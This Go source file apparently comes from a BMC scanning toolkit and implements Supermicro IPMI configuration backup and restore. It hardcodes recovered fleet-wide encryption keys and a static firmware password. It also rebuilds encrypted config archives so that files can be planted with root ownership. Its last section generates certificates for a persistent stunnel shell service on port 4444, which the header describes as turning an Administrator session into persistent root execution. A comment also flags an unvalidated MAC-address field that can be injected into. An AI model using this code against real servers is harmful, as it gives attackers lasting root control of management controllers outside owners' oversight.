package ipmi

// Supermicro/ATEN OEM configuration backup + restore over IPMI (NetFn 0x30 cmd
// 0xA0 "FileTransactions", Administrator), plus the file-placement primitive that
// turns an Administrator session into persistent root execution.
//
// Container layering, outermost first: <cipher>-CBC( PKCS#7( CRC32 || gzip tar of
// ./preserve_config/ ) ). The CRC is inside the encryption and is checked only
// after the plaintext is written, so a wrong key yields garbage, not an error.

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/md5"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"hash/crc32"
	"io"
	"math/big"
	"sort"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/guid"
)

// FileTransactions command coordinates.
const (
	NetFnSMCOEM            byte = 0x30
	CmdSMCFileTransactions byte = 0xA0

	// SMCX14ActionRestorePSOOBB is the ApplyFileCommand action byte that
	// dispatches the uploaded file to RestorePSOOBBFile on X14 (OpenBMC).
	// The handler parses the upload as XML and feeds the Networking/MacAddr
	// "value" attribute to smci::network::UtilSetMacAddr unvalidated.
	SMCX14ActionRestorePSOOBB byte = 0x05

	smcSubGetUploadResvID  byte = 0x01
	smcSubStartUpload      byte = 0x02
	smcSubFileUpload       byte = 0x03
	smcSubApply            byte = 0x04
	smcSubPrepDownload     byte = 0x05
	smcSubPrepDownloadDone byte = 0x06
	smcSubFileDownload     byte = 0x07
	smcSubFileDownloadDone byte = 0x08

	// SMCFileTypeConfig is FileActionTable type 0x01 (RestoreConfig on import;
	// the download path ORs 0x80 to reach 0x81 = SaveConfig).
	SMCFileTypeConfig byte = 0x01

	// Handler-enforced ceilings: download count <= 0x5DC (1500); RMCP+ request
	// datalen <= 0x5C5 (1477), so upload payload <= 1470. Defaults stay well
	// under the path MTU to avoid IP fragmentation.
	smcMaxDownloadChunk = 1500
	smcMaxUploadChunk   = 1470
	// Conservative defaults avoid sustained-transfer timeouts observed on X10
	// and H13. Operators can still raise them with --chunk on known-good paths.
	smcDefDownloadChunk = 500
	smcDefUploadChunk   = 500

	smcArchivePrefix = "./preserve_config/"
)

// SMCConfigCipher identifies the block cipher a generation uses for its config
// container. The ATEN generations are not uniform: X11 uses AES-128-CBC with a
// fixed 16-byte IV, while X10 and the kohandler generations (H13/X12/X13/...)
// use 3DES-EDE3-CBC with an all-zero 8-byte IV.
type SMCConfigCipher string

const (
	SMCCipherAES128CBC SMCConfigCipher = "aes-128-cbc"
	SMCCipher3DESCBC   SMCConfigCipher = "3des-ede3-cbc"
)

// SMCObfuscationIV is the fixed AES-128-CBC IV shared by the AES generations
// (X11, H13). The 3DES generations use an all-zero IV instead.
var SMCObfuscationIV = []byte{
	0x2e, 0x7b, 0x4c, 0x71, 0xd0, 0x45, 0x2a, 0x6b,
	0x89, 0xb8, 0x9a, 0xf9, 0x6a, 0xb3, 0xc6, 0xca,
}

// SMCCryptoProfile is a generation's recovered config-obfuscation parameters.
type SMCCryptoProfile struct {
	Cipher SMCConfigCipher
	Key    []byte
	IV     []byte
}

// smcCryptoProfiles maps a detected BMC generation to its recovered,
// fleet-shared config-obfuscation profile. Generations whose key is not
// recovered are absent; pass --config-key/--config-cipher/--config-iv for those.
var smcCryptoProfiles = map[string]SMCCryptoProfile{
	// X11: AES-128-CBC, fixed IV, 16-byte key from key_obfuscation_SW.
	"X11": {SMCCipherAES128CBC, mustDecodeHex("a22874547aba7a32cf8ac49c1896722f"), SMCObfuscationIV},
	// X10: 3DES-EDE3-CBC, zero IV, 24-byte key hardcoded in libipmi.so.
	"X10": {SMCCipher3DESCBC, mustDecodeHex("f1da33a298120612060792ffaa998811998877445588aabb"), make([]byte, 8)},
	// H13: AES-128-CBC, fixed IV, 16-byte key from the kohandler transform.
	"H13": {SMCCipherAES128CBC, mustDecodeHex("ba8cc4a492d2c24aafa2143c48de8a2f"), SMCObfuscationIV},
}

func mustDecodeHex(s string) []byte {
	b, err := hex.DecodeString(s)
	if err != nil {
		panic("smc-backup: bad built-in hex: " + err.Error())
	}
	return b
}

// SMCCryptoProfileForGeneration returns the known config profile for a BMC
// generation ("X10", "X11", ...), and whether one is built in. The returned
// slices are copies.
func SMCCryptoProfileForGeneration(gen string) (SMCCryptoProfile, bool) {
	p, ok := smcCryptoProfiles[strings.ToUpper(strings.TrimSpace(gen))]
	if !ok {
		return SMCCryptoProfile{}, false
	}
	return SMCCryptoProfile{
		Cipher: p.Cipher,
		Key:    append([]byte(nil), p.Key...),
		IV:     append([]byte(nil), p.IV...),
	}, true
}

// smcNewBlock builds the block cipher for a profile.
func smcNewBlock(cipher SMCConfigCipher, key []byte) (cipherBlock, error) {
	switch cipher {
	case SMCCipher3DESCBC:
		return des.NewTripleDESCipher(key)
	case SMCCipherAES128CBC, "":
		return aes.NewCipher(key)
	default:
		return nil, fmt.Errorf("unsupported config cipher %q", cipher)
	}
}

// cipherBlock is the subset of cipher.Block used here.
type cipherBlock = interface {
	BlockSize() int
	Encrypt(dst, src []byte)
	Decrypt(dst, src []byte)
}

// SMCGenerationResult reports the BMC generation inferred from the IPMI System
// GUID board code.
type SMCGenerationResult struct {
	Generation  string `json:"generation"`
	ModelPrefix string `json:"modelPrefix"`
	GUIDHex     string `json:"guidHex"`
}

// SMCGeneration reads Get System GUID (0x06/0x37) in-session and maps the
// embedded board code to a BMC generation (X9..X14, H13, ...).
func (s *CmdSess) SMCGeneration(ctx context.Context) (*SMCGenerationResult, error) {
	if s == nil || s.runner == nil {
		return nil, fmt.Errorf("session closed")
	}
	cc, data, err := s.runner.Exec(NetFnApp, CmdGetSystemGUID, nil)
	if err != nil {
		return nil, err
	}
	if cc != 0x00 {
		return nil, fmt.Errorf("get system guid cc=0x%02x", cc)
	}
	if len(data) < 16 {
		return nil, fmt.Errorf("get system guid short reply (%d bytes)", len(data))
	}
	g := guid.Decode(data[:16])
	res := &SMCGenerationResult{GUIDHex: g.Hex}
	if g.Fields != nil {
		res.ModelPrefix = g.Fields["model_prefix"]
	}
	res.Generation = guid.SMCGenerationFromModelPrefix(res.ModelPrefix)
	return res, nil
}

// SMCConfigXfer drives the OEM config export/import command set on one session.
type SMCConfigXfer struct {
	sess          *CmdSess
	UploadChunk   int
	DownloadChunk int
	PollInterval  time.Duration
	PollDeadline  time.Duration
}

// NewSMCConfigXfer wraps an authenticated session.
func NewSMCConfigXfer(sess *CmdSess) *SMCConfigXfer {
	return &SMCConfigXfer{
		sess:          sess,
		UploadChunk:   smcDefUploadChunk,
		DownloadChunk: smcDefDownloadChunk,
		PollInterval:  time.Second,
		PollDeadline:  3 * time.Minute,
	}
}

// sub issues one FileTransactions subcommand. runner.Exec already retries on
// transport timeout (--max-retries), so this does not loop.
func (x *SMCConfigXfer) sub(data []byte) (byte, []byte, error) {
	if x == nil || x.sess == nil {
		return 0xff, nil, fmt.Errorf("session closed")
	}
	return x.sess.ExecRaw(NetFnSMCOEM, CmdSMCFileTransactions, data)
}

// Export downloads and returns the encrypted config blob for the given type
// (SMCFileTypeConfig for the full config). Read-only against the BMC.
func (x *SMCConfigXfer) Export(ctx context.Context, ftype byte) ([]byte, error) {
	chunk := x.DownloadChunk
	if chunk <= 0 || chunk > smcMaxDownloadChunk {
		chunk = smcDefDownloadChunk
	}

	cc, out, err := x.sub([]byte{smcSubPrepDownload, ftype})
	if err != nil {
		return nil, fmt.Errorf("PrepareFileDownload: %w", err)
	}
	if cc != 0x00 {
		return nil, fmt.Errorf("PrepareFileDownload cc=0x%02x (%s)", cc, smcCCName(cc))
	}
	if len(out) < 2 {
		return nil, fmt.Errorf("PrepareFileDownload short reply (%d bytes)", len(out))
	}
	rid := binary.LittleEndian.Uint16(out[:2])
	ridLo, ridHi := byte(rid), byte(rid>>8)
	reportCommandProgress(ctx, "smc-backup: reservation 0x%04x (type 0x%02x->0x%02x)", rid, ftype, ftype|0x80)

	// Poll PrepareFileDownloadDone until ready; it returns busy flag + size.
	var size uint32
	interval := x.PollInterval
	if interval <= 0 {
		interval = time.Second
	}
	deadline := time.Now().Add(x.PollDeadline)
	for {
		cc, out, err = x.sub([]byte{smcSubPrepDownloadDone, ridLo, ridHi})
		if err != nil {
			return nil, fmt.Errorf("PrepareFileDownloadDone: %w", err)
		}
		if cc != 0x00 {
			return nil, fmt.Errorf("PrepareFileDownloadDone cc=0x%02x (%s)", cc, smcCCName(cc))
		}
		if len(out) < 5 {
			return nil, fmt.Errorf("PrepareFileDownloadDone short reply (%d bytes)", len(out))
		}
		if out[0] == 0 { // 0 = ready, size follows
			size = binary.LittleEndian.Uint32(out[1:5])
			break
		}
		reportCommandProgress(ctx, "smc-backup: still generating")
		if time.Now().After(deadline) {
			return nil, fmt.Errorf("export never became ready within %s", x.PollDeadline)
		}
		if err := sleepCtx(ctx, interval); err != nil {
			return nil, err
		}
	}
	reportCommandProgress(ctx, "smc-backup: ready, %d bytes", size)
	if size == 0 {
		return nil, fmt.Errorf("BMC reported a zero-byte export")
	}

	buf := make([]byte, 0, size)
	for uint32(len(buf)) < size {
		if err := ctx.Err(); err != nil {
			return nil, err
		}
		off := uint32(len(buf))
		want := min(size-off, uint32(chunk))
		req := []byte{smcSubFileDownload, ridLo, ridHi}
		req = appendLE32(req, off)
		req = appendLE16(req, uint16(want))
		cc, out, err = x.sub(req)
		if err != nil {
			return nil, fmt.Errorf("FileDownload off=%d: %w", off, err)
		}
		if cc != 0x00 {
			return nil, fmt.Errorf("FileDownload off=%d cc=0x%02x (%s)", off, cc, smcCCName(cc))
		}
		if len(out) == 0 {
			return nil, fmt.Errorf("FileDownload off=%d returned 0 bytes", off)
		}
		// Clamp to the requested count: a sequential read of `want` bytes returns
		// exactly those file bytes, so a longer reply carries a spurious trailing
		// byte. Appending only `want` keeps the total at exactly `size`.
		n := min(uint32(len(out)), want)
		buf = append(buf, out[:n]...)
		reportCommandProgress(ctx, "smc-backup: %d/%d bytes", len(buf), size)
	}

	// Best-effort cleanup of the BMC-side /tmp file.
	if cc, _, err := x.sub([]byte{smcSubFileDownloadDone, ridLo, ridHi}); err == nil && cc != 0x00 {
		reportCommandProgress(ctx, "smc-backup: FileDownloadDone cc=0x%02x (BMC /tmp file may linger)", cc)
	}
	if uint32(len(buf)) != size {
		return nil, fmt.Errorf("size mismatch: got %d expected %d", len(buf), size)
	}
	return buf, nil
}

// Upload stages a blob into /tmp/uploadfile_<id> on the BMC and returns the
// reservation ID. It does not apply the config.
func (x *SMCConfigXfer) Upload(ctx context.Context, blob []byte) (uint16, error) {
	chunk := x.UploadChunk
	if chunk <= 0 || chunk > smcMaxUploadChunk {
		chunk = smcDefUploadChunk
	}
	if len(blob) == 0 {
		return 0, fmt.Errorf("refusing to upload an empty blob")
	}

	cc, out, err := x.sub([]byte{smcSubGetUploadResvID})
	if err != nil {
		return 0, fmt.Errorf("GetUploadResvID: %w", err)
	}
	if cc != 0x00 {
		return 0, fmt.Errorf("GetUploadResvID cc=0x%02x (%s)", cc, smcCCName(cc))
	}
	if len(out) < 2 {
		return 0, fmt.Errorf("GetUploadResvID short reply (%d bytes)", len(out))
	}
	rid := binary.LittleEndian.Uint16(out[:2])
	ridLo, ridHi := byte(rid), byte(rid>>8)
	reportCommandProgress(ctx, "smcrestore: reservation 0x%04x", rid)

	start := []byte{smcSubStartUpload, ridLo, ridHi}
	start = appendLE32(start, uint32(len(blob)))
	cc, _, err = x.sub(start)
	if err != nil {
		return 0, fmt.Errorf("StartFileUpload: %w", err)
	}
	if cc != 0x00 {
		return 0, fmt.Errorf("StartFileUpload cc=0x%02x (%s)", cc, smcCCName(cc))
	}

	for off := 0; off < len(blob); off += chunk {
		if err := ctx.Err(); err != nil {
			return 0, err
		}
		end := min(off+chunk, len(blob))
		req := []byte{smcSubFileUpload, ridLo, ridHi}
		req = appendLE32(req, uint32(off))
		req = append(req, blob[off:end]...)
		cc, _, err = x.sub(req)
		if err != nil {
			return 0, fmt.Errorf("FileUpload off=%d: %w", off, err)
		}
		if cc != 0x00 {
			return 0, fmt.Errorf("FileUpload off=%d cc=0x%02x (%s)", off, cc, smcCCName(cc))
		}
		reportCommandProgress(ctx, "smcrestore: %d/%d bytes", end, len(blob))
	}
	return rid, nil
}

// Apply commits a staged upload. For SMCFileTypeConfig this restores the config
// and the BMC cold-resets immediately, so the reply may or may not arrive; a
// transport error here is expected and not necessarily a failure.
func (x *SMCConfigXfer) Apply(ctx context.Context, rid uint16, ftype byte) (byte, error) {
	req := []byte{smcSubApply, byte(rid), byte(rid >> 8), ftype}
	cc, _, err := x.sub(req)
	if err != nil {
		return 0xff, err
	}
	return cc, nil
}

// ---- config container crypto ----

// SMCContainerWrap builds <cipher>-CBC( PKCS#7( CRC32_LE(pt) || pt ) ) for the
// given cipher (AES-128-CBC or 3DES-EDE3-CBC). iv must match the cipher block
// size (16 for AES, 8 for 3DES).
func SMCContainerWrap(pt, key, iv []byte, cipherKind SMCConfigCipher) ([]byte, error) {
	block, err := smcNewBlock(cipherKind, key)
	if err != nil {
		return nil, err
	}
	if len(iv) != block.BlockSize() {
		return nil, fmt.Errorf("iv must be %d bytes for %s", block.BlockSize(), cipherKind)
	}
	body := make([]byte, 4+len(pt))
	binary.LittleEndian.PutUint32(body[:4], crc32.ChecksumIEEE(pt))
	copy(body[4:], pt)
	body = pkcs7Pad(body, block.BlockSize())
	out := make([]byte, len(body))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(out, body)
	return out, nil
}

// SMCContainerUnwrap decrypts a container and returns (plaintext, crcOK). Like
// the firmware, the plaintext is returned regardless of whether the CRC matches.
func SMCContainerUnwrap(ct, key, iv []byte, cipherKind SMCConfigCipher) ([]byte, bool, error) {
	block, err := smcNewBlock(cipherKind, key)
	if err != nil {
		return nil, false, err
	}
	if len(iv) != block.BlockSize() {
		return nil, false, fmt.Errorf("iv must be %d bytes for %s", block.BlockSize(), cipherKind)
	}
	if len(ct) == 0 || len(ct)%block.BlockSize() != 0 {
		return nil, false, fmt.Errorf("ciphertext is not a whole number of %d-byte blocks", block.BlockSize())
	}
	raw := make([]byte, len(ct))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(raw, ct)
	raw = pkcs7Unpad(raw, block.BlockSize())
	if len(raw) < 4 {
		return nil, false, fmt.Errorf("decrypted output too short (wrong key?)")
	}
	want := binary.LittleEndian.Uint32(raw[:4])
	pt := raw[4:]
	ok := crc32.ChecksumIEEE(pt) == want
	return pt, ok, nil
}

// SMCLooksGzip reports whether b starts with the gzip magic.
func SMCLooksGzip(b []byte) bool {
	return len(b) >= 2 && b[0] == 0x1f && b[1] == 0x8b
}

// SMCLooksOpenSSLSalted reports whether b begins with the OpenSSL `enc`
// "Salted__" magic (8 bytes of magic + 8 bytes of salt).
//
// Older X10 firmware adds a second encryption layer under the obfuscation
// container: once the obfuscation key decrypts and the CRC validates, the payload
// is an `openssl enc -aes-256-cbc -salt` blob rather than a gzip tar. Detecting it
// lets callers report the format instead of a misleading gzip header error.
func SMCLooksOpenSSLSalted(b []byte) bool {
	return len(b) >= 16 && string(b[:8]) == "Salted__"
}

// smcOpenSSLMagic is the 8-byte prefix OpenSSL `enc` writes before the salt.
var smcOpenSSLMagic = []byte("Salted__")

// SMCConfigInnerPassword is the fleet-static password older X10 firmware feeds to
// `openssl enc -aes-256-cbc -salt` for the inner config layer. It is hardcoded in
// that firmware's config-backup path and publicly documented, so it serves as the
// built-in default alongside the obfuscation keys - no per-unit secret involved.
var SMCConfigInnerPassword = []byte("CKSAM1SUCKSAM1SUASMUCIKSASMUCIKS")

// smcATENInnerMagic prefixes the gzip tar inside the inner openssl-enc layer on
// these older units: the plaintext is "ATEN" + 0x01 0x00 + gzip. It is stripped
// on unwrap and restored on wrap so callers always see a bare gzip tar.
var smcATENInnerMagic = []byte("ATEN\x01\x00")

// evpBytesToKeyMD5 reproduces OpenSSL's EVP_BytesToKey(EVP_md5(), salt, pass, 1)
// key-derivation, the default for `openssl enc` on the OpenSSL 1.0.x builds these
// X10 boards ship (no -pbkdf2, no -md). It returns keyLen+ivLen bytes:
//
//	D_1 = MD5(pass || salt); D_i = MD5(D_{i-1} || pass || salt); out = D_1 || D_2 || ...
func evpBytesToKeyMD5(pass, salt []byte, keyLen, ivLen int) (key, iv []byte) {
	var out, prev []byte
	for len(out) < keyLen+ivLen {
		h := md5.New()
		h.Write(prev)
		h.Write(pass)
		h.Write(salt)
		prev = h.Sum(nil)
		out = append(out, prev...)
	}
	return out[:keyLen], out[keyLen : keyLen+ivLen]
}

// SMCOpenSSLSaltedUnwrap decrypts an `openssl enc -aes-256-cbc -salt -pass
// pass:<password>` blob (the older X10 FW ~3.5x inner config layer): it reads the
// 8-byte salt after the "Salted__" magic, derives key+IV via EVP_BytesToKey(MD5),
// AES-256-CBC decrypts, and strips PKCS#7 padding. The returned bool reports
// whether the result looks like a gzip tar, so a wrong password (garbage output)
// is distinguishable from success.
func SMCOpenSSLSaltedUnwrap(blob, password []byte) (pt []byte, looksGzip bool, err error) {
	if !SMCLooksOpenSSLSalted(blob) {
		return nil, false, fmt.Errorf("not an openssl Salted__ blob")
	}
	salt := blob[8:16]
	ct := blob[16:]
	if len(ct) == 0 || len(ct)%aes.BlockSize != 0 {
		return nil, false, fmt.Errorf("ciphertext is not a whole number of %d-byte blocks", aes.BlockSize)
	}
	key, iv := evpBytesToKeyMD5(password, salt, 32, aes.BlockSize)
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, false, err
	}
	raw := make([]byte, len(ct))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(raw, ct)
	raw = pkcs7Unpad(raw, aes.BlockSize)
	// The plaintext is "ATEN"+0x01 0x00 then the gzip tar; strip the magic so the
	// caller sees a bare gzip tar (tolerate its absence for forward-compat).
	raw = bytes.TrimPrefix(raw, smcATENInnerMagic)
	return raw, SMCLooksGzip(raw), nil
}

// SMCOpenSSLSaltedWrap is the inverse of SMCOpenSSLSaltedUnwrap: it PKCS#7-pads
// pt, derives key+IV from a fresh random 8-byte salt via EVP_BytesToKey(MD5),
// AES-256-CBC encrypts, and prepends "Salted__"+salt - byte-for-byte what
// `openssl enc -aes-256-cbc -salt -pass pass:<password>` produces, so a rebuilt
// config re-encrypts into the exact form the firmware's restore path expects.
func SMCOpenSSLSaltedWrap(pt, password []byte) ([]byte, error) {
	salt := make([]byte, 8)
	if _, err := rand.Read(salt); err != nil {
		return nil, err
	}
	key, iv := evpBytesToKeyMD5(password, salt, 32, aes.BlockSize)
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	// Restore the "ATEN"+0x01 0x00 magic ahead of the gzip tar (the firmware's
	// restore path expects it), unless the caller already included it.
	inner := pt
	if !bytes.HasPrefix(inner, smcATENInnerMagic) {
		inner = append(append([]byte{}, smcATENInnerMagic...), pt...)
	}
	padded := pkcs7Pad(inner, aes.BlockSize)
	ct := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(ct, padded)
	out := append(append([]byte{}, smcOpenSSLMagic...), salt...)
	return append(out, ct...), nil
}

func pkcs7Pad(b []byte, block int) []byte {
	n := block - (len(b) % block)
	if n == 0 {
		n = block
	}
	return append(b, bytes.Repeat([]byte{byte(n)}, n)...)
}

// pkcs7Unpad removes PKCS#7 padding when it is well-formed; otherwise it returns
// b unchanged (a wrong key produces a bogus pad byte, and we still want to hand
// the caller something to inspect).
func pkcs7Unpad(b []byte, block int) []byte {
	if len(b) == 0 || len(b)%block != 0 {
		return b
	}
	n := int(b[len(b)-1])
	if n < 1 || n > block || n > len(b) {
		return b
	}
	for _, c := range b[len(b)-n:] {
		if int(c) != n {
			return b
		}
	}
	return b[:len(b)-n]
}

// ---- archive rebuild ----

// SMCArchiveEdit describes edits to a decrypted config archive. Keys are member
// names relative to preserve_config/ (e.g. "syslog.conf").
type SMCArchiveEdit struct {
	Append  map[string][]byte // append bytes to an existing member (with a separating newline)
	Add     map[string][]byte // add a new member (fails if it already exists)
	Replace map[string][]byte // replace a member's contents entirely (no-op if absent)
	Upsert  map[string][]byte // replace if present, otherwise add (idempotent reinstall)
	Remove  []string          // delete a member entirely (for uninstall)
}

// SMCArchiveReport summarizes what changed.
type SMCArchiveReport struct {
	Appended  []string `json:"appended,omitempty"`
	Added     []string `json:"added,omitempty"`
	Replaced  []string `json:"replaced,omitempty"`
	Removed   []string `json:"removed,omitempty"`
	Unchanged int      `json:"unchanged"`
}

type smcMember struct {
	hdr  *tar.Header
	data []byte
}

// SMCRebuildArchive copies every member of the source gzip-tar verbatim (mode,
// uid/gid, mtime, type -- so root ownership is preserved for the on-BMC restore)
// and applies the requested edits. It refuses to drop any member present in the
// source. Never hand-build an archive from scratch: on X10/X13/H13SSF the
// restore copy loop has no existence guard and deletes /nv files absent from the
// archive.
func SMCRebuildArchive(srcTarGz []byte, edit SMCArchiveEdit) ([]byte, *SMCArchiveReport, error) {
	members, err := smcReadArchive(srcTarGz)
	if err != nil {
		return nil, nil, err
	}
	if len(members) == 0 {
		return nil, nil, fmt.Errorf("source archive has no members")
	}

	// Template header for newly added files: the first regular file, so new
	// members inherit root ownership and the ustar format.
	var template *tar.Header
	for _, m := range members {
		if m.hdr.Typeflag == tar.TypeReg {
			template = m.hdr
			break
		}
	}
	if template == nil {
		return nil, nil, fmt.Errorf("source archive has no regular files")
	}

	rep := &SMCArchiveReport{}
	srcNames := map[string]bool{}
	// Member removal (uninstall): a Remove key matches by archive key.
	removeSet := map[string]bool{}
	for _, name := range edit.Remove {
		removeSet[name] = true
	}
	kept := make([]smcMember, 0, len(members))
	for i := range members {
		m := &members[i]
		srcNames[m.hdr.Name] = true
		key := smcMemberKey(m.hdr.Name)
		if removeSet[key] {
			rep.Removed = append(rep.Removed, key)
			continue
		}
		switch {
		case m.hdr.Typeflag == tar.TypeReg && edit.Append[key] != nil:
			extra := edit.Append[key]
			d := m.data
			if len(d) > 0 && d[len(d)-1] != '\n' {
				d = append(d, '\n')
			}
			d = append(d, extra...)
			m.data = d
			m.hdr.Size = int64(len(d))
			rep.Appended = append(rep.Appended, key)
		case m.hdr.Typeflag == tar.TypeReg && edit.Replace[key] != nil:
			m.data = append([]byte(nil), edit.Replace[key]...)
			m.hdr.Size = int64(len(m.data))
			rep.Replaced = append(rep.Replaced, key)
		default:
			rep.Unchanged++
		}
		kept = append(kept, *m)
	}
	members = kept
	sort.Strings(rep.Removed)

	for name, content := range edit.Add {
		full := smcArchivePrefix + name
		if srcNames[full] {
			return nil, nil, fmt.Errorf("refusing to --add an existing member: %s", name)
		}
		hdr := &tar.Header{
			Name:     full,
			Size:     int64(len(content)),
			Mode:     0o644,
			Uid:      template.Uid,
			Gid:      template.Gid,
			Uname:    template.Uname,
			Gname:    template.Gname,
			ModTime:  template.ModTime,
			Typeflag: tar.TypeReg,
			Format:   tar.FormatGNU,
		}
		members = append(members, smcMember{hdr: hdr, data: append([]byte(nil), content...)})
		rep.Added = append(rep.Added, name)
	}
	sort.Strings(rep.Added)

	// Upsert: replace in place when the member already exists, otherwise add.
	// This makes reinstall idempotent (members left as inert stubs by uninstall,
	// or from a prior install, are overwritten instead of erroring).
	for name, content := range edit.Upsert {
		full := smcArchivePrefix + name
		if srcNames[full] {
			matched := false
			for i := range members {
				if smcMemberKey(members[i].hdr.Name) == name {
					members[i].data = append([]byte(nil), content...)
					members[i].hdr.Size = int64(len(content))
					matched = true
					break
				}
			}
			if !matched {
				return nil, nil, fmt.Errorf("internal: existing member %s disappeared during rebuild", name)
			}
			rep.Replaced = append(rep.Replaced, name)
			continue
		}
		hdr := &tar.Header{
			Name:     full,
			Size:     int64(len(content)),
			Mode:     0o644,
			Uid:      template.Uid,
			Gid:      template.Gid,
			Uname:    template.Uname,
			Gname:    template.Gname,
			ModTime:  template.ModTime,
			Typeflag: tar.TypeReg,
			Format:   tar.FormatGNU,
		}
		members = append(members, smcMember{hdr: hdr, data: append([]byte(nil), content...)})
		rep.Added = append(rep.Added, name)
	}
	sort.Strings(rep.Replaced)
	sort.Strings(rep.Added)

	out, err := smcWriteArchive(members)
	if err != nil {
		return nil, nil, err
	}

	// Independent verification: re-read and confirm no source member was lost,
	// except those explicitly removed by the caller.
	rebuilt, err := smcReadArchive(out)
	if err != nil {
		return nil, nil, fmt.Errorf("verify: re-reading rebuilt archive: %w", err)
	}
	dstNames := map[string]bool{}
	for _, m := range rebuilt {
		dstNames[m.hdr.Name] = true
	}
	for name := range srcNames {
		if !dstNames[name] && !removeSet[smcMemberKey(name)] {
			return nil, nil, fmt.Errorf("refusing: rebuilt archive lost member %s", name)
		}
	}
	return out, rep, nil
}

func smcMemberKey(name string) string {
	n := strings.TrimPrefix(name, smcArchivePrefix)
	n = strings.TrimPrefix(n, "preserve_config/")
	return strings.TrimPrefix(n, "/")
}

func smcReadArchive(gz []byte) ([]smcMember, error) {
	zr, err := gzip.NewReader(bytes.NewReader(gz))
	if err != nil {
		return nil, fmt.Errorf("gzip: %w (wrong key, or not a decrypted backup?)", err)
	}
	defer zr.Close()
	tr := tar.NewReader(zr)
	var out []smcMember
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return nil, fmt.Errorf("tar: %w", err)
		}
		var data []byte
		if hdr.Typeflag == tar.TypeReg {
			data, err = io.ReadAll(tr)
			if err != nil {
				return nil, fmt.Errorf("tar read %s: %w", hdr.Name, err)
			}
		}
		h := *hdr
		out = append(out, smcMember{hdr: &h, data: data})
	}
	return out, nil
}

func smcWriteArchive(members []smcMember) ([]byte, error) {
	var buf bytes.Buffer
	zw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(zw)
	for _, m := range members {
		h := *m.hdr
		if h.Format == tar.FormatUnknown || h.Format == tar.FormatPAX {
			h.Format = tar.FormatGNU // busybox 1.23.1 wants GNU/ustar, not PAX
		}
		if err := tw.WriteHeader(&h); err != nil {
			return nil, err
		}
		if h.Typeflag == tar.TypeReg && len(m.data) > 0 {
			if _, err := tw.Write(m.data); err != nil {
				return nil, err
			}
		}
	}
	if err := tw.Close(); err != nil {
		return nil, err
	}
	if err := zw.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// SMCArchiveMemberNames lists the member names in a decrypted archive (for
// verification/reporting).
func SMCArchiveMemberNames(gz []byte) ([]string, error) {
	members, err := smcReadArchive(gz)
	if err != nil {
		return nil, err
	}
	names := make([]string, 0, len(members))
	for _, m := range members {
		names = append(names, m.hdr.Name)
	}
	sort.Strings(names)
	return names, nil
}

// SMCArchiveMember returns one member's bytes from a decrypted archive.
func SMCArchiveMember(gz []byte, key string) ([]byte, bool, error) {
	members, err := smcReadArchive(gz)
	if err != nil {
		return nil, false, err
	}
	for _, m := range members {
		if smcMemberKey(m.hdr.Name) == key {
			return m.data, true, nil
		}
	}
	return nil, false, nil
}

// ---- shell-service payload ----

// SMCShellService parameters the persistent debug service.
type SMCShellService struct {
	Port          int    // TCP port to listen on (default 4444)
	StartDelaySec int    // seconds to wait after boot before starting (default 20)
	CACertPEM     []byte // the client certificate pinned in CAfile (verify=4: must byte-match)
}

// SMCShellClientCert is a freshly generated client identity for the service.
//
// stunnel's `verify = 4` pins by exact bytes: the presented certificate must be
// byte-identical to the one in CAfile, not merely chain up to it. Keep this a
// single self-signed cert acting as both the pinned CAfile entry and the presented
// client cert; a leaf signed by a separate CA fails the match.
type SMCShellClientCert struct {
	CertPEM     []byte `json:"-"`
	KeyPEM      []byte `json:"-"`
	Fingerprint string `json:"fingerprint"` // SHA256, colon-separated hex
	CommonName  string `json:"commonName"`
}

// GenerateSMCShellClientCert creates a self-signed RSA client certificate to pin
// in the service's CAfile. RSA (not ed25519) for compatibility with the board's
// OpenSSL 1.0.1 / stunnel 4.56.
func GenerateSMCShellClientCert(cn string) (*SMCShellClientCert, error) {
	if cn == "" {
		cn = "oobscan-smc-dbg-client"
	}
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}
	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return nil, err
	}
	tmpl := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: cn},
		// Backdated by years: boards with a dead RTC battery or no NTP sync read
		// well behind real time, and a NotBefore in the future by the board's own
		// clock makes stunnel reject the cert as "not yet valid".
		NotBefore: time.Now().Add(-5 * 365 * 24 * time.Hour),
		NotAfter:  time.Now().Add(10 * 365 * 24 * time.Hour),
		// KeyUsageCertSign is required so OpenSSL/stunnel will accept this
		// self-signed cert as its own issuer when it is pinned as the CA under
		// `verify = 4`; without it stunnel fails with "unable to get local issuer
		// certificate".
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
		IsCA:                  true, // self-signed leaf pinned directly by verify=4
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return nil, err
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})
	sum := sha256.Sum256(der)
	fp := make([]string, len(sum))
	for i, b := range sum {
		fp[i] = fmt.Sprintf("%02X", b)
	}
	return &SMCShellClientCert{
		CertPEM:     certPEM,
		KeyPEM:      keyPEM,
		Fingerprint: strings.Join(fp, ":"),
		CommonName:  cn,
	}, nil
}

